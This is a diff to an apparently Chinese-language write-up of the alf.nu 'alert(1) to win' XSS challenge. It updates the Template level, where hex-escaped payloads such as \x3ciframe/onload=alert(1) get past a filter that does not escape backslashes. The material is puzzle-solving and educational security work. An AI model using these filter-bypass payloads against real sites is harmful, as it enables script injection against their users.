@@ -16,7 +16,7 @@ https://alf.nu/alert(1)#accesstoken=NoNIWDnsKLzlDa2hkyRw
 > - [x]  <a href="#a006">DOM (32)</a>
 > - [x]  <a href="#a007">Callback (14)</a>
 > - [x]  <a href="#a008">Skandia (52)</a>
-> - [x]  <a href="#a009">Template (27)</a>
+> - [x]  <a href="#a009">Template (26)</a>
 > - [x]  <a href="#a010">JSON 2 (35)</a>
 > - [x]  <a href="#a011">Callback 2 (16)</a>
 > - [x]  <a href="#a012">Skandia 2 (137)</a>
@@ -248,7 +248,7 @@ Output
 ```
 
 <a name="a009"/></a>
-### Template (29)
+### Template (26)
 ```javascript
 function escape(s) {
   function htmlEscape(s) {
@@ -279,7 +279,7 @@ function escape(s) {
 ```
 注入的地方在`<a href=#>{name}</a>`中的`{name}`字段，对`< > & " '`字符进行了转义，但是没有转义`\`字符，于是利用十六进制构建payload
 ```html
-\x3ciframe/onload=alert(1)
+\x3ciframe/onload=alert(1) 
 ```
 Output
 ```html                                       
@@ -288,6 +288,10 @@ Output
          var v = document.getElementById('name');    
          v.innerHTML = '<a href=#>\x3ciframe/onload=alert(1) </a>';       
       </script>                                   
+```
+2018-10-12更新
+```html
+\x3cstyle/onload=alert(1) 
 ```
 
 <a name="a010"/></a>
